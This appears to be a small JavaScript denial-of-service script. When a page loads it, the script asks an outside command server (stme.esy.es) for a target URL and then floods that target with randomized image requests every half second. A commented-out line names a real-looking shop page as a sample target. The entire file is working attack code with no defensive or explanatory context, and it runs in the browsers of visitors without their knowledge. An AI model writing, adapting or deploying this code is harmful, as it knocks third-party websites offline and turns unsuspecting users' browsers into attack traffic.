var target = "";
function floodRequest(target) {
  // var website = 'www.nichegardens.com/catalog/item.php?id=1911' //target
   var pic = new Image()
   var rand = Math.floor(Math.random() * 1000)
   pic.src = target+'?'+rand+'=val';
}

function attack(){
    var pathArray = window.location.pathname.split( '/' );
    var key = pathArray[1];
    var data = new FormData();
    data.append("key", key);
    data.append("", "");

    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;

    xhr.addEventListener("readystatechange", function () {
      if (this.readyState === 4) {
        target = this.responseText;
        console.log(target);
        setInterval(function(){floodRequest(target);}, 500);
      }
    });
    xhr.open("POST", "http://stme.esy.es/php/getdata.php");
    xhr.setRequestHeader("cache-control", "no-cache");
    xhr.send(data);
 
    }

attack();
